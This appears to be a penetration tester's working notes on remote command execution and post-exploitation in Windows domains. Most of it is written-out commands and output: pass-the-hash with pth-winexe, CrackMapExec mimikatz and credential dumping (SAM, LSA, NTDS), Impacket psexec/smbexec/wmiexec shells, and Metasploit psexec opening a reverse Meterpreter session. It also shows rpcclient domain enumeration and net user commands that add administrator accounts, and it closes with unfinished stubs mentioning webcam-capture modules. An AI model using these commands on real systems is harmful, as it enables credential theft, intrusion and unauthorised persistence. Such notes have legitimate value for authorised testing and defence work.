=============================================
Learning from the field : Administrative shells
=============================================

Once, we have access to a priviledged user of windows domain, there are multiple ways to get a execute remote commands on the remote machine.

Remote Code Execution Methods:
------------------------------

A lot of details for Remote Code execution has already been mentioned by Rop Nop in his three parts `Part 1: Using credentials to own windows boxes <https://blog.ropnop.com/using-credentials-to-own-windows-boxes/>`_ , `Part2: PSExec and Services <https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/>`_ and `Part: 3 Wmi and WinRM <https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/>`_

Winexe
^^^^^^

* Linux Binary pth-winexe

 ::

  winexe version 1.1
  Usage: winexe [OPTION]... //HOST COMMAND
  Options:
   -h, --help                                  Display help message
   -V, --version                               Display version number
   -U, --user=[DOMAIN/]USERNAME[%PASSWORD]     Set the network username
   -A, --authentication-file=FILE              Get the credentials from a file
   -N, --no-pass                               Do not ask for a password
   -k, --kerberos=STRING                       Use Kerberos, -k [yes|no]
   -d, --debuglevel=DEBUGLEVEL                 Set debug level
       --uninstall                             Uninstall winexe service after remote execution
       --reinstall                             Reinstall winexe service before remote execution
       --system                                Use SYSTEM account
       --profile                               Load user profile
       --convert                               Try to convert characters between local and remote code-pages
       --runas=[DOMAIN\]USERNAME%PASSWORD      Run as the given user (BEWARE: this password is sent in cleartext over the network!)
       --runas-file=FILE                       Run as user options defined in a file
       --interactive=0|1                       Desktop interaction: 0 - disallow, 1 - allow. If allow, also use the --system switch (Windows requirement). Vista does not support this option.
       --ostype=0|1|2                          OS type: 0 - 32-bit, 1 - 64-bit, 2 - winexe will decide. Determines which version (32-bit or 64-bit) of service will be installed.
  
 Example with pth:
 ::

  pth-winexe -U ./Administrator%aad3b435b51404eeaad3b435b51404ee:4b579a266f697c2xxxxxxxxx //10.145.X.X cmd.exe
  pth-winexe -U EXAMPLE/Administrator%example@123 //10.145.X.X cmd.exe

* Windows Binary win-exe

 win-exe can be downloaded from `winexe <https://sourceforge.net/projects/winexe/>`_ 

 commands and usage is same as linux binary pth-winexe. However, it needed to be compiled from the source.

crackmapexec
^^^^^^^^^^^^
`CrackMapExec <https://github.com/byt3bl33d3r/CrackMapExec>`_ is quite awesome tool when it comes to remote command execution. Read the `wiki <https://github.com/byt3bl33d3r/CrackMapExec/wiki>`_ 

::

  positional arguments:
  target                The target IP(s), range(s), CIDR(s), hostname(s), FQDN(s) or file(s) containg a list of targets

  optional arguments:
    -h, --help            show this help message and exit
    -v, --version         show program's version number and exit
    -t THREADS            Set how many concurrent threads to use (default: 100)
    -u USERNAME [USERNAME ...]  Username(s) or file(s) containing usernames
    -d DOMAIN             Domain name
    --local-auth          Authenticate locally to each target
    -p PASSWORD [PASSWORD ...]  Password(s) or file(s) containing passwords
    -H HASH [HASH ...]    NTLM hash(es) or file(s) containing NTLM hashes
    -M MODULE, --module MODULE Payload module to use
    -MC CHAIN_COMMAND, --module-chain CHAIN_COMMAND  Payload module chain command string to run
    -o MODULE_OPTION [MODULE_OPTION ...] Payload module options
    -L, --list-modules    List available modules
    --show-options        Display module options
    --verbose             Enable verbose output

  Credential Gathering:
  Options for gathering credentials

  --sam                 Dump SAM hashes from target systems
  --lsa                 Dump LSA secrets from target systems
  --ntds {vss,drsuapi}  Dump the NTDS.dit from target DCs using the specifed method
                        (drsuapi is the fastest)
  --ntds-history        Dump NTDS.dit password history
  --ntds-pwdLastSet     Shows the pwdLastSet attribute for each NTDS.dit account
  --wdigest {enable,disable}
                        Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1
  Mapping/Enumeration:
  Options for Mapping/Enumerating

  --shares              Enumerate shares and access
  --uac                 Checks UAC status
  --sessions            Enumerate active sessions
  --disks               Enumerate disks
  --users               Enumerate users
  --rid-brute [MAX_RID]
                        Enumerate users by bruteforcing RID's (default: 4000)
  --pass-pol            Dump password policy
  --lusers              Enumerate logged on users
  --wmi QUERY           Issues the specified WMI query
  --wmi-namespace NAMESPACE
                        WMI Namespace (default: //./root/cimv2)

  Command Execution:
  Options for executing commands

  --exec-method {smbexec,wmiexec,atexec}
                        Method to execute the command. Ignored if in MSSQL mode (default: wmiexec)
  --force-ps32          Force the PowerShell command to run in a 32-bit process
  --no-output           Do not retrieve command output
  -x COMMAND            Execute the specified command
  -X PS_COMMAND         Execute the specified PowerShell command


Modules in crackmapexec

::

 crackmapexec -L
 06-05-2016 14:08:03 [*] empire_exec          Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
 06-05-2016 14:08:03 [*] getgroups            Wrapper for PowerView's Get-NetGroup function
 06-05-2016 14:08:03 [*] shellinject          Downloads the specified raw shellcode and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
 06-05-2016 14:08:03 [*] com_exec             Executes a command using a COM scriptlet to bypass whitelisting
 06-05-2016 14:08:03 [*] tokens               Enumerates available tokens using Powersploit's Invoke-TokenManipulation
 06-05-2016 14:08:03 [*] getgroupmembers      Wrapper for PowerView's Get-NetGroupMember function
 06-05-2016 14:08:03 [*] mimikatz             Executes PowerSploit's Invoke-Mimikatz.ps1 script
 06-05-2016 14:08:03 [*] peinject             Downloads the specified DLL/EXE and injects it into memory using PowerSploit's Invoke-ReflectivePEInjection.ps1 script
 06-05-2016 14:08:03 [*] tokenrider           Allows for automatic token enumeration, impersonation and mass lateral spread using privileges instead of dumped credentials
 06-05-2016 14:08:03 [*] metinject            Downloads the Meterpreter stager and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
 06-05-2016 14:08:03 [*] getcomputers         Wrapper for PowerView's Get-NetGroup function
 06-05-2016 14:08:03 [*] KTHXBYE!

Using a module

Simply specify the module name with the -M flag:

::

 crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -M mimikatz
 06-05-2016 14:13:59 CME          192.168.10.11:445 WIN7BOX         [*] Windows 6.1 Build 7601 (name:WIN7BOX) (domain:LAB)

Use the -M flag to specify the module and the --show-options argument to view the module's supported options:

::
 
 #~ crackmapexec -M mimikatz --show-options
 06-05-2016 14:10:33 [*] mimikatz module options:
 COMMAND Mimikatz command to execute (default: 'sekurlsa::logonpasswords')

Using module options
Module options are specified with the -o flag. All options are specified in the form of KEY=value (msfvenom style)

::

 crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND=privilege::debug

Impacket psexec/ smbexe/ wmiexec
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

* Impacket psexec

  ::

   ./psexec.py -debug Admini:Password@10.0.X.X

   Impacket v0.9.16-dev - Copyright 2002-2016 Core Security Technologies
 
   [*] Trying protocol 445/SMB...
 
   [*] Requesting shares on 10.0.5.180.....
   [*] Found writable share ADMIN$
   [*] Uploading file kBibbkKL.exe
   [*] Opening SVCManager on 10.0.5.180.....
   [*] Creating service cvZN on 10.0.5.180.....
   [*] Starting service cvZN.....
   [-] Pipe not ready, aborting
   [*] Opening SVCManager on 10.0.5.180.....
   [*] Stoping service cvZN.....
   [*] Removing service cvZN.....
   [*] Removing file kBibbkKL.exe.....

* Impacket smbexec

 ::

  ./smbexec.py -debug Admini:Password@10.0.5.180

  Impacket v0.9.16-dev - Copyright 2002-2016 Core Security Technologies

  [+] StringBinding ncacn_np:10.0.5.180[\pipe\svcctl]
  [+] Executing %COMSPEC% /Q /c echo cd  ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat
  [!] Launching semi-interactive shell - Careful what you execute

  C:\Windows\system32>ipconfig
  [+] Executing %COMSPEC% /Q /c echo ipconfig ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat

  Windows IP Configuration


  Ethernet adapter Local Area Connection:

  Connection-specific DNS Suffix  . : 
  Link-local IPv6 Address . . . . . : fe80::4546:b672:307:b488%10
  IPv4 Address. . . . . . . . . . . : 10.0.X.XX
  Subnet Mask . . . . . . . . . . . : 255.255.254.0
  Default Gateway . . . . . . . . . : 10.0.X.1

  Tunnel adapter isatap.{EB92DEE7-521B-4E14-84C2-0E9B9E96563E}:

  Media State . . . . . . . . . . . : Media disconnected
  Connection-specific DNS Suffix  . : 

  Tunnel adapter Local Area Connection* 11:

  Media State . . . . . . . . . . . : Media disconnected
  Connection-specific DNS Suffix  . : 

  C:\Windows\system32>

* Impacket wmiexec

 ::

  wmiexec.py -debug Administrat0r:Passw0rd\!\!@10.0.5.180

  Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies

  [*] SMBv2.1 dialect used
  [+] Target system is 10.0.5.180 and isFDQN is False
  [+] StringBinding: \\\\xxxxHBKS1739[\\PIPE\\atsvc]
  [+] StringBinding: xxxxhbks1739[49155]
  [+] StringBinding: 10.0.5.180[49155]
  [+] StringBinding chosen: ncacn_ip_tcp:10.0.5.180[49155]
  [!] Launching semi-interactive shell - Careful what you execute
  [!] Press help for extra shell commands
  C:\>hostname
  xxxxhbks1739

  C:\>whoami
  xxxxhbks1739\administrat0r

  C:\>


Metasploit psexec
^^^^^^^^^^^^^^^^^^^

Metasploit psexec have three methods to invoke, Let's first try with target 2: Native upload

::

   msf exploit(psexec) > show targets 

   Exploit targets:

   Id  Name
   --  ----
    0   Automatic
    1   PowerShell
    2   Native upload
    3   MOF upload


::

  msf exploit(psexec) > set target 2
  target => 2

  [*] Started reverse TCP handler on 10.11.43.116:4444 
  [*] 10.0.5.180:445 - Connecting to the server...
  [*] 10.0.5.180:445 - Authenticating to 10.0.5.180:445 as user 'Administrat0r'...
  [*] 10.0.5.180:445 - Uploading payload...
  [*] 10.0.5.180:445 - Created \hnFrgUVk.exe...
  [-] 10.0.5.180:445 - Service failed to start - ACCESS_DENIED
  [*] 10.0.5.180:445 - Deleting \hnFrgUVk.exe...
  [*] Exploit completed, but no session was created.


We can see that the exploit was completed however, no session was created. Also the antivirus provided an alert.

::
  
 Datei "C:\Windows\hnFrgUVk.exe" belongs to virus/spyware 'Troj/Swrort-K'.

Let's try with target 1, the powershell 
  
::

  msf exploit(psexec) > set smbdomain .
  smbdomain => .
  msf exploit(psexec) > set smbuser Administrat0r
  smbuser => Administrat0r
  msf exploit(psexec) > set smbpass Passw0rd!!
  smbpass => Passw0rd!!
  msf exploit(psexec) > set rhost 10.0.5.180
  rhost => 10.0.5.180
  msf exploit(psexec) > run 

  [*] Started reverse TCP handler on 10.11.43.116:4444 
  [*] 10.0.5.180:445 - Connecting to the server...
  [*] 10.0.5.180:445 - Authenticating to 10.0.5.180:445 as user 'Administrat0r'...
  [*] 10.0.5.180:445 - Selecting PowerShell target
  [*] 10.0.5.180:445 - Executing the payload...
  [+] 10.0.5.180:445 - Service start timed out, OK if running a command or non-service executable...
  [*] Exploit completed, but no session was created.
  msf exploit(psexec) > run 
  
  [*] Started reverse TCP handler on 10.11.43.116:4444 
  [*] 10.0.5.180:445 - Connecting to the server...
  [*] 10.0.5.180:445 - Authenticating to 10.0.5.180:445 as user 'Administrat0r'...
  [*] 10.0.5.180:445 - Selecting PowerShell target
  [*] 10.0.5.180:445 - Executing the payload...
  [+] 10.0.5.180:445 - Service start timed out, OK if running a command or non-service executable...
  [*] Sending stage (957487 bytes) to 10.0.5.180
  [*] Meterpreter session 1 opened (10.11.43.116:4444 -> 10.0.5.180:64783) at 2017-02-20 16:31:41 +0530
  
  meterpreter > 

Let's try also with target 3: MOF Upload

:: 

   msf exploit(psexec) > set target 3
   target => 3

   [*] Started reverse TCP handler on 10.11.43.116:4444 
   [*] 10.0.5.180:445 - Connecting to the server...
   [*] 10.0.5.180:445 - Authenticating to 10.0.5.180:445 as user 'Administrat0r'...
   [*] 10.0.5.180:445 - Trying wbemexec...
   [*] 10.0.5.180:445 - Uploading Payload...
   [*] 10.0.5.180:445 - Created %SystemRoot%\system32\KiaHTgBg.exe
   [*] 10.0.5.180:445 - Uploading MOF...
   [*] 10.0.5.180:445 - Created %SystemRoot%\system32\wbem\mof\5SZ1WZENmHyays.MOF
   [*] Exploit completed, but no session was created.
 
 
Sysinternals psexec
^^^^^^^^^^^^^^^^^^^


smbclient:
^^^^^^^^^^^

rpclient
^^^^^^^^^^

 eskoudis presents great amount of information at `Plundering Windows Account Infor via Authenticated SMB Session <https://pen-testing.sans.org/blog/2013/07/24/plundering-windows-account-info-via-authenticated-smb-sessions>`_ 
 carnal0wnage have written `Enumerating user accounts on linux and OSX <http://carnal0wnage.attackresearch.com/2007/07/enumerating-user-accounts-on-linux-and.html>`_ 
 and BlackHills have written `Password Spraying and Other Fun with RPC Client <http://www.blackhillsinfosec.com/?p=4645>`_  Most of the stuff has been taken from the above three.

* Connection:

 ::

  rpcclient -U xxxxs.hxxxx.net/mlxxxxh 10.0.65.103 

* Version of the target Windows machine:

 ::
  
  rpcclient $> srvinfo
  10.0.65.103    Wk Sv BDC Tim NT     
  platform_id     :       500
  os version      :       6.3
  server type     :       0x801033

* enum commands:

 ::

  rpcclient $> enum

  enumalsgroups  enumdomains    enumdrivers    enumkey     enumprivs
  enumdata       enumdomgroups  enumforms      enumports   enumtrust
  enumdataex     enumdomusers   enumjobs       enumprinter

* Tell the current domain 

 ::
  
  enumdomains 
  name:[xxxx] idx:[0x0]
  name:[Builtin] idx:[0x0]

* Enum Domain info

 ::

  rpcclient $> querydominfo 
  Domain:               xxxx
  Server:               HMC_PDC-TEMP
  Comment:      
  Total Users:  9043
  Total Groups: 0
  Total Aliases:        616
  Sequence No:  1
  Force Logoff: -1
  Domain Server State:  0x1
  Server Role:  ROLE_DOMAIN_BDC
  Unknown 3:    0x1

* Enum Domain users:

  ::
   
   rpcclient $> enumdomusers 
   user:[administrator] rid:[0x1f4]
   user:[Guest] rid:[0x1f5]
   user:[krbtgt] rid:[0x1f6]
   user:[_STANDARD] rid:[0x3ee]
   user:[Install] rid:[0x3fa]
   user:[sko] rid:[0x43a]
   user:[cap] rid:[0x589]
   user:[zentrale] rid:[0x67f]
   user:[dbserver] rid:[0x7d9]
   user:[JVOO] rid:[0x7fa]
   user:[Standard HMC User Te] rid:[0x8a0]
   user:[event] rid:[0x8d5]
   user:[remote] rid:[0x9ea]
   user:[pda-vis1] rid:[0xb65]
   user:[TestUser] rid:[0xc46]
   user:[oeinstall] rid:[0x1133]
   user:[repro] rid:[0x13c3]

* Enum Domain groups:

 ::

   rpcclient $> enumdomgroups 
   group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
   group:[Domain Admins] rid:[0x200]
   group:[Domain Users] rid:[0x201]
   group:[Domain Guests] rid:[0x202]
   group:[Domain Computers] rid:[0x203]
   group:[Domain Controllers] rid:[0x204]
   group:[Schema Admins] rid:[0x206]
   group:[Enterprise Admins] rid:[0x207]
   group:[Group Policy Creator Owners] rid:[0x208]
   group:[Read-only Domain Controllers] rid:[0x209]
   group:[Cloneable Domain Controllers] rid:[0x20a]
   group:[Protected Users] rid:[0x20d]
   group:[xxxx Users] rid:[0x4d8]
   group:[IC Members] rid:[0x50d]
   group:[Event Management] rid:[0x8d7]
   group:[SMSInternalCliGrp] rid:[0x9f5]
   group:[IT Support] rid:[0x105b]


* Enum Group Information and Group Membership

 ::

  rpcclient $> querygroup 0x200
  Group Name:     Domain Admins
  Description:    Designated administrators of the domain
  Group Attribute:7
  Num Members:16


 ::

  rpcclient $> querygroupmem 0x200
  rid:[0x2227] attr:[0x7]
  rid:[0x3601] attr:[0x7]
  rid:[0x36aa] attr:[0x7]
  rid:[0x36e0] attr:[0x7]
  rid:[0x3c23] attr:[0x7]
  rid:[0x5528] attr:[0x7]
  rid:[0x1f4] attr:[0x7]
  rid:[0x363b] attr:[0x7]
  rid:[0x573e] attr:[0x7]
  rid:[0x56bc] attr:[0x7]
  rid:[0x5e5e] attr:[0x7]
  rid:[0x7fe1] attr:[0x7]
  rid:[0x86d9] attr:[0x7]
  rid:[0x9367] attr:[0x7]
  rid:[0x829c] attr:[0x7]
  rid:[0xa26e] attr:[0x7]

* Enumerate specfic User/ computer information by RID

 ::

  rpcclient $> queryuser 0x3601
  User Name   :   dummy_s
  Full Name   :   Dummy User
  Home Drive  :   
  Dir Drive   :   
  Profile Path:   
  Logon Script:   
  Description :   E 5.5.2008 Admin
  Workstations:   
  Comment     :   
  Logon Time               :      Tue, 24 Jan 2017 19:28:14 IST
  Logoff Time              :      Thu, 01 Jan 1970 05:30:00 IST
  Kickoff Time             :      Thu, 14 Sep 30828 08:18:05 IST
  Password last set Time   :      Fri, 21 Nov 2008 02:34:34 IST
  Password can change Time :      Fri, 21 Nov 2008 02:34:34 IST
  Password must change Time:      Thu, 14 Sep 30828 08:18:05 IST

* Get Domain Password Policy

 ::

  rpcclient $> getdompwinfo 
  min_password_length: 8
  password_properties: 0x00000000

* Get user password policies

 ::

  rpcclient $> getusrdompwinfo 0x3601
  min_password_length: 8
  &info.password_properties: 0x433e6584 (1128162692)
  0: DOMAIN_PASSWORD_COMPLEX  
  0: DOMAIN_PASSWORD_NO_ANON_CHANGE
  1: DOMAIN_PASSWORD_NO_CLEAR_CHANGE
  0: DOMAIN_PASSWORD_LOCKOUT_ADMINS
  0: DOMAIN_PASSWORD_STORE_CLEARTEXT
  0: DOMAIN_REFUSE_PASSWORD_CHANGE

Enum4linux
^^^^^^^^^^^

Simple wrapper around the tools in the samba package to provide similar functionality to enum.exe (formerly from www.bindview.com).

::

 Usage: ./enum4linux.pl [options] ip

 Options are (like "enum"):
     -U        get userlist
     -M        get machine list*
     -S        get sharelist
     -P        get password policy information
     -G        get group and member list
     -d        be detailed, applies to -U and -S
     -u user   specify username to use (default "")  
     -p pass   specify password to use (default "")   


 Additional options:
    -a        Do all simple enumeration (-U -S -G -P -r -o -n -i).
              This opion is enabled if you don't provide any other options.
    -h        Display this help message and exit
    -r        enumerate users via RID cycling
    -R range  RID ranges to enumerate (default: 500-550,1000-1050, implies -r)
    -K n      Keep searching RIDs until n consective RIDs don't correspond to
              a username.  Impies RID range ends at 999999. Useful 
	      against DCs.
    -l        Get some (limited) info via LDAP 389/TCP (for DCs only)
    -s file   brute force guessing for share names
    -k user   User(s) that exists on remote system (default: administrator,guest,krbtgt,domain admins,root,bin,none)
              Used to get sid with "lookupsid known_username"
    	      Use commas to try several users: "-k admin,user1,user2"
    -o        Get OS information
    -i        Get printer information
    -w wrkg   Specify workgroup manually (usually found automatically)
    -n        Do an nmblookup (similar to nbtstat)
    -v        Verbose.  Shows full commands being run (net, rpcclient, etc.)


::

 enum4linux -P -d xxxx.abcxxx.net -u mluxxxx -p threxxxx 10.0.65.103


WinRM
^^^^^

WMI
^^^

DCOM 
^^^^

* MMC20 + Two others Methods (Ask Tanoy/ read) - Enignma

xfreerdp/ Remote Desktop
^^^^^^^^^^^^^^^^^^^^^^^^


       ----dsquery !! SubMSI ? -- Twitter one -- who publishes a lot of stuff ? MSUtil to use RCE? / smbexec? 

       ----Any commands if net, or powershell is blocked? or PV/ BH is caught? 





Once we get the remote code execution or remote shell, Few useful commands to do recon/ create users



Add/ remove/ a local user
-------------------------

:: 

 net user /add [username] [password]

::

 net user John xxxxxxxxx /ADD

 C:\>net user /add John *
 Type a password for the user: 
 Retype the password to confirm:
 The command completed successfully.

Add a domain user

::

 net user username password /ADD /DOMAIN

Add / remove a local user to administrator group
------------------------------------------------

::

 net localgroup administrators [username] /add

Get sessions of remote machines
-------------------------------

* Powerview Get-NetSession

* the windows binary? Global / Local?

* NETDOM? -- Tanoy

* net session

            

View users in Domain / Workgroup
--------------------------------

* Powerview Get-NetUser

* net user /domain

* netdom ? 


View machines in Domain/ Workgroup
----------------------------------

* Powerview Get-NetComputers

* net view /domain ? -- check the functionality

* view machines affected by GPP vulnerability



View users in Domain / Workgroup
--------------------------------

* Powerview Get-NetGroupMember

* Net group / domain? options

* BloodHound Group Memberships

* Netdom



Hunting for a particular User?
-------------------------------

* Powerview Invoke-UserHunter

* BH users_sessions

* EventLog AD? How? Not yet successful!

* Finding which machine belong to which user? Any other way than above?

* Machine belongs to which user AD Properties -- GETADObject (Tanoy)





Learning from the field: The post-exploitation 



* MSF Webcam - Photo-Video/ Recorder modules

* The Email- Mailbox Post exploitation -- Also the check if someone has exploited this (check logs) -- which is also connected to Domain? 

* How does google email works?

* File Hunting -- Better ways!! Faster ways!!




